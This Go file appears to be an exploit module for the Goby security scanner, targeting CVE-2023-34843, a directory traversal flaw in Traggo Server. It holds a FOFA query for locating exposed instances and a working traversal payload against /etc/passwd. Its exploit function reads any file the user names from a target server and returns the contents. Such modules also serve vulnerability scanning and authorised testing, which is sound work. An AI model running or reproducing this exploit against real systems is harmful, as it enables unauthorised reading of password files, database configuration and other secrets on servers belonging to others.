package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "TraggoServer /static File Read Vulnerability(CVE-2023-34843)",
    "Description": "<p>Traggo Server is a label based time tracking tool. Traggo Server 0.3.0 is vulnerable to directory traversal attacks through constructed GET requests.</p>",
    "Product": "Traggo",
    "Homepage": "https://github.com/traggo",
    "DisclosureDate": "2023-06-28",
    "PostTime": "2024-09-29",
    "Author": "wangzhao@baimaohui.net",
    "FofaQuery": "title=\"Traggo\" && body=\"/static/js/main.29d450bb.chunk.js\"",
    "GobyQuery": "title=\"Traggo\" && body=\"/static/js/main.29d450bb.chunk.js\"",
    "Level": "1",
    "Impact": "<p>Attackers can read all sensitive information stored on the server, such as database configuration files, user passwords, etc.</p>",
    "Recommendation": "<p>1.Please follow the manufacturer's homepage for updates: <a href=\"https://github.com/traggo/server\">https://github.com/traggo/server</a></p><p>2. Deploy a web application firewall.  </p><p> 3. If it is not necessary, it is forbidden to access the system on the public network.</p>",
    "References": [
        "https://github.com/rootd4ddy/CVE-2023-34843"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "Customize,info",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "etc/passwd",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/static/..%5c..%5c..%5c..%5cetc/passwd",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/static/..%5c..%5c..%5c..%5cetc/passwd",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read",
        "2H1W"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2023-34843"
    ],
    "CNNVD": [
        "CNNVD-202306-2124"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "TraggoServer /static 文件读取漏洞（CVE-2023-34843）",
            "Product": "Traggo Server",
            "Description": "<p>Traggo Server 是一个基于标签的时间跟踪工具。Traggo Server 0.3.0 容易受到通过构建的 GET 请求进行目录遍历的攻击。<br></p>",
            "Recommendation": "<p>1、请关注厂商主页更新：<a href=\"https://github.com/traggo/server\">https://github.com/traggo/server</a><br></p><p>2、部署Web应用防火墙。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>攻击者可以读取服务器上存储的所有敏感信息，如数据库配置文件、用户密码等。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "TraggoServer /static File Read Vulnerability(CVE-2023-34843)",
            "Product": "Traggo",
            "Description": "<p>Traggo Server is a label based time tracking tool. Traggo Server 0.3.0 is vulnerable to directory traversal attacks through constructed GET requests.<br></p>",
            "Recommendation": "<p>1.Please follow the manufacturer's homepage for updates: <a href=\"https://github.com/traggo/server\">https://github.com/traggo/server</a><br></p><p>2. Deploy a web application firewall.&nbsp;&nbsp;</p><p>&nbsp;3. If it is not necessary, it is forbidden to access the system on the public network.<br></p>",
            "Impact": "<p>Attackers can read all sensitive information stored on the server, such as database configuration files, user passwords, etc.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9957"
}`
	postOrGet_m9jXTEDGmn := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		header := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
			"Accept-Language": "zh-CN,zh;q=0.9",
			"Connection":      "close",
		}

		resp, err := setGetRequest(hostInfo, "/static/..%5c..%5c..%5c..%5c"+fileUrl, header)
		if err != nil || resp.StatusCode != 200 {
			return "", err
		}

		// 注意：返回值为（最终要返回的读取结果，错误）
		return resp.RawBody, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/static/..%5c..%5c..%5c..%5c"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"etc/passwd": "root",
			}
			// 函数继承
			uploadFileFunc := postOrGet_m9jXTEDGmn

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL + fileUrl
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])
			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"info": {"etc/passwd", "root"},
			}

			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_m9jXTEDGmn

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = "敏感信息泄露\n" + resp
			return expResult
		},
	))
}
